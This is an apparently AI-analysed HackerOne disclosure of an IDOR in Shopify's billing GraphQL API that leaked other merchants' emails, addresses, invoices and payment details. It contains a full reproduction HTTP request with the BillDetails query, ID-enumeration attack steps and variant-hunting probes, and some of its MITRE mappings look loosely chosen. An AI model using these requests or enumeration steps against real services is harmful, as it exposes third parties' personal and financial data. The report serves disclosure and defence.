# IDOR on GraphQL BillingDocumentDownload and BillDetails Queries

## Metadata
- **Source:** HackerOne
- **Report:** 2207248 | https://hackerone.com/reports/2207248
- **Submitted:** 2023-10-12
- **Reporter:** blaklis
- **Program:** Shopify
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Insecure Direct Object Reference (IDOR), Broken Object Level Authorization, Information Disclosure, GraphQL Authorization Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
An IDOR vulnerability in Shopify's GraphQL API allows authenticated users to access billing invoice data of other merchants by manipulating the BillingInvoice ID parameter. The vulnerability exposes highly sensitive information including email addresses, full billing addresses, invoice contents, payment method details (credit card last 4 digits and type or PayPal email), and affected shop information from arbitrary merchants.

## Attack scenario
1. Attacker logs into any Shopify merchant account with valid credentials
2. Attacker identifies the structure of BillingInvoice IDs through their own invoices
3. Attacker modifies the 'id' variable in the BillDetails or BillingDocumentDownload GraphQL query to target sequential or enumerated invoice IDs
4. Backend fails to validate that the requesting user owns the queried BillingInvoice
5. GraphQL API returns complete invoice details including PII and payment information of other merchants
6. Attacker can iterate through invoice IDs to harvest data from multiple merchants systematically

## Root cause
Missing or ineffective authorization checks at the GraphQL resolver level for the BillingInvoice node query. The application validates authentication (user is logged in) but fails to verify object ownership before returning sensitive billing data. The 'node(id: $id)' generic query pattern lacks merchant-scoped authorization logic.

## Attacker mindset
An attacker with basic GraphQL knowledge and valid Shopify merchant access can systematically enumerate and extract sensitive financial and personal data from competitor merchants or arbitrary targets. The attack requires minimal effort once the vulnerability is discovered, making it highly attractive for competitive intelligence, fraud, or data aggregation purposes.

## Defensive takeaways
- Implement object-level authorization checks before returning any data from GraphQL resolvers, not just authentication checks
- Scope all queries to the authenticated user's organization/shop context automatically at the resolver level
- Use allowlists and deny patterns to validate ID parameters format and ownership before processing
- Implement comprehensive authorization middleware for GraphQL that validates every field access against user permissions
- Audit all generic 'node(id)' query implementations for missing authorization logic
- Add rate limiting and anomaly detection for repeated access to different invoice IDs
- Implement field-level security to redact PII in responses based on user permissions
- Log and alert on access patterns that suggest enumeration attacks
- Conduct security review of all GraphQL operations handling sensitive financial data

## Variant hunting
Check BillingDocumentDownload operation for similar ID-based IDOR on document retrieval
Test other GraphQL queries accessing merchant data: orders, customers, transactions, subscriptions
Look for IDOR in other node(id) queries across the API (products, apps, themes, etc.)
Test batch queries with multiple merchant IDs to bypass per-request authorization
Attempt to access deleted or archived invoices through ID enumeration
Check for IDOR on PaymentMethod and BillingAccount queries with different ID formats
Test query aliases to bypass authorization checks that key on operation name
Look for authorization bypass through mutation operations on billing entities

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (GraphQL vulnerability)
- T1526 - Enumerate External Targets (invoice ID enumeration)
- T1589 - Gather Victim Identity Information (email, address collection)
- T1589.001 - Credentials (payment method details harvesting)
- T1087 - Account Discovery (merchant enumeration via invoice IDs)
- T1555 - Credentials from Password Stores (payment method information)
- T1040 - Network Sniffing (sensitive data transmission without proper controls)

## Notes
This vulnerability affects the admin.shopify.com API and requires valid authentication but no special permissions. The exposure of payment method details (last 4 digits, card type, PayPal email) combined with full addresses and invoice contents creates severe risk for fraud, phishing, and OSINT. The generic nature of the node query pattern suggests potential for similar IDOR issues across other GraphQL operations in Shopify's platform. The vulnerability was discovered through direct testing after identifying invoice ID patterns, indicating insufficient obfuscation of sensitive object identifiers.

## Full report
<details><summary>Expand</summary>

## Summary:
An IDOR on the `BillingInvoice` id on both `BillingDocumentDownload` and `BillDetails` graphql operations are leaking other merchants' ██████: 

- email
- full address
- content of their invoice
- last 4 digits of credit card + type of credit card OR paypal email
- shop impacted

## Shops Used to Test:
Tested ID ██████ before I saw it was indeed embedding others' customers data.

## Relevant Request IDs:
f858a40e-ad0d-407a-a589-3ffb40cc5ae5

## Steps To Reproduce:

1. Whatever the user you're loggedin with, run the following request : 

```
POST /api/shopify/███?operation=BillDetails&type=query HTTP/2
Host: admin.shopify.com
Cookie: ██████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████████
Caller-Pathname: /store/████████/access_account/invoice/███
Content-Length: 6674
Origin: https://admin.shopify.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: cyan
Te: trailers

{"operationName":"BillDetails","variables":{"id":"████","hasBillingSubscriptionsPermission":false},"query":"query BillDetails($id: ID!, $hasBillingSubscriptionsPermission: Boolean!) {\n  shop {\n    id\n    myshopifyDomain\n    countryCode\n    createdAt\n    name\n    plan {\n      name\n      __typename\n    }\n    easeMerchantFailedBillManualPaymentAttempts: experimentAssignment(\n      name: \"ease_merchant_failed_bill_manual_payment_attempts\"\n    )\n    __typename\n  }\n  billingAccount {\n    id\n    subscription @include(if: $hasBillingSubscriptionsPermission) {\n      id\n      billingPeriod\n      __typename\n    }\n    activePaymentMethod {\n      __typename\n      ... on BillingBankAccount {\n        id\n        bankName\n        lastDigits\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingCreditCard {\n        id\n        brand\n        lastDigits\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingReseller {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingPaypalAccount {\n        id\n        email\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingBalance {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingShopifyBalanceCard {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingManualPayment {\n        id\n        compatibleCurrencies\n        __typename\n      }\n      ... on BillingUpiAccount {\n        id\n        upiId\n        compatibleCurrencies\n        __typename\n      }\n    }\n    ...BillingPaymentMethods\n    validPaymentMethods\n    currency\n    __typename\n  }\n  node(id: $id) {\n    id\n    ... on BillingInvoice {\n      id\n      credits {\n        name\n        category\n        invoiceAmount {\n          amount\n          currencyCode\n          __typename\n        }\n        __typename\n      }\n      chargeCategories {\n        shopId\n        shopName\n        shopDomain\n        category\n        name\n        description\n        count\n        subtotalAmount {\n          amount\n          currencyCode\n          __typename\n        }\n        charges {\n          __typename\n          discountValue {\n            __typename\n            ... on AppSubscriptionDiscountPercentage {\n              percentage\n              __typename\n            }\n            ... on AppSubscriptionDiscountAmount {\n              amount {\n                amount\n                currencyCode\n                __typename\n              }\n              __typename\n            }\n          }\n          amount {\n            amount\n            currencyCode\n            __typename\n          }\n          originalAmount {\n            amount\n            currencyCode\n            __typename\n          }\n          exchangeRate\n          exchangeRateAt\n          issuedAt\n          description\n          title\n          apiClientId\n          feeType\n          hasTraceabilityBetaFlag\n          chargesUrl: url\n        }\n        __typename\n      }\n      createdAt\n      billOn\n      dueOn\n      netTerm\n      status\n      name\n      originClassification\n      prefixBillName\n      purchaseType\n      authenticationStatus\n      strongCustomerAuthenticationPayload {\n        clientToken\n        paymentMethodNonce\n        redirectUrl\n        type\n        __typename\n      }\n      lastFailureReason\n      lastFailureMessage\n      totalAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      totalCreditAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      subtotalAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      refundedAmount {\n        amount\n        currencyCode\n        __typename\n      }\n      timeline {\n        status\n        date\n        amount {\n          amount\n          currencyCode\n          __typename\n        }\n        __typename\n      }\n      paymentMethod {\n        __typename\n        ... on BillingBankAccount {\n          id\n          bankName\n          lastDigits\n          synchronous\n          __typename\n        }\n        ... on BillingCreditCard {\n          id\n          brand\n          lastDigits\n          synchronous\n          __typename\n        }\n        ... on BillingReseller {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingPaypalAccount {\n          id\n          email\n          synchronous\n          __typename\n        }\n        ... on BillingBalance {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingManualPayment {\n          id\n          synchronous\n          __typename\n        }\n        ... on BillingUpiAccount {\n          id\n          upiId\n          synchronous\n          __typename\n        }\n        ... on BillingShopifyBalanceCard {\n          id\n          synchronous\n          __typename\n        }\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment BillingPaymentMethods on BillingAccount {\n  id\n  paymentMethods {\n    __typename\n    ... on BillingBankAccount {\n      id\n      priority\n      bankName\n      lastDigits\n      verificationStatus\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingCreditCard {\n      id\n      priority\n      brand\n      lastDigits\n      expired\n      expiryMonth\n      expiryYear\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingShopifyBalanceCard {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingReseller {\n      id\n      priority\n      uid\n      handle\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingPaypalAccount {\n      id\n      priority\n      email\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingBalance {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingShopifyBalanceAccount {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingUpiAccount {\n      id\n      priority\n      upiId\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n    ... on BillingManualPayment {\n      id\n      priority\n      synchronous\n      compatibleCurrencies\n      __typename\n    }\n  }\n  __typename\n}\n"}
```

That will give you some infos about the invoice.

You can also download the PDF of the invoice, with different infos embedded in it : 

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type

</details>

---
*Analysed by Claude on 2026-05-11*
